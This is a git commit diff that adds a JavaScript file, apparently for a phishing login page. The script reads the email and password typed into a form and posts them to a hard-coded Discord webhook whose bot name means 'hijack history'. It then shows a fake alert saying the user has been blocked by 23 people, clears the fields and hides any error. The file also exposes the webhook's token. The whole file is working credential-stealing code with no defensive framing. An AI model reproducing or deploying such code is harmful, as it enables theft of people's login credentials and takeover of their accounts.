e500c847aa4759beb229a202db3a65d52f244471
cdn984ikkh <omanks769@gmail.com>
2025-10-17 13:26:23 +0900

    y

---
+++ script.js
@@ -0,0 +1,47 @@
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1428302981086056488/XBzxOb-lcrfzm0aaikR6l7YB6NqMHoR_jA2CdlQIkG4eCxlUPSprSYMcCyEJlfPVZH0a";
+
+
+document.addEventListener('DOMContentLoaded', () => {
+    const loginButton = document.getElementById('sendToDiscordButton');
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+
+
+    loginButton.onclick = async function(event) {
+        event.preventDefault(); 
+        
+        const emailValue = emailInput.value;
+        const passwordValue = passwordInput.value;
+
+        const messageContent = `**メールアドレス:** ${emailValue}\n**パスワード:** ${passwordValue}`;
+        
+        await sendToDiscord(messageContent);
+        
+        alert("あなたは23人にブロックされています。"); 
+        
+        emailInput.value = '';
+        passwordInput.value = '';
+    }
+});
+
+
+async function sendToDiscord(content) {
+    
+    const data = {
+        "content": content, 
+        "username": "乗っ取り履歴",
+    };
+
+    try {
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        });
+        
+    } catch (error) {
+    
+    }
+}
